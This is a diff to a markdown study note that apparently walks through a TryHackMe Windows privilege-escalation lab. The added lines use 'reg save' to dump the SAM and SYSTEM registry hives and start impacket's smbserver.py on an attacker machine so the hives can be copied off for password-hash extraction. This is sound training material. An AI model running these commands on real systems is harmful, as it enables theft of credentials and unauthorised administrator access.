@@ -672,11 +672,26 @@ The easiest way to gain access to another user is to gather credentials from a c
     Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
     <details>
     <summary>DEMO</summary>
+
     This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:  
-   <img src="https://user-images.githubusercontent.com/73976100/224528670-d58b9283-39a0-479e-b713-9ede338e4721.png" width="300">  
+    <img src="https://user-images.githubusercontent.com/73976100/224528670-d58b9283-39a0-479e-b713-9ede338e4721.png" width="300">  
     
     Once on the command prompt, we can check our privileges with the following command:  
     <img src="https://user-images.githubusercontent.com/73976100/224528777-25e6fb8b-5cc6-41fe-b617-548ee2a7659d.png" width="600">  
+
+    To backup the SAM and SYSTEM hashes, we can use the following commands:  
+    ```
+    C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+    C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+    ```  
+
+    This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:  
+    ```
+    user@attackerpc$ mkdir share  
+
+    user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+    ```  
+    
 
 
 
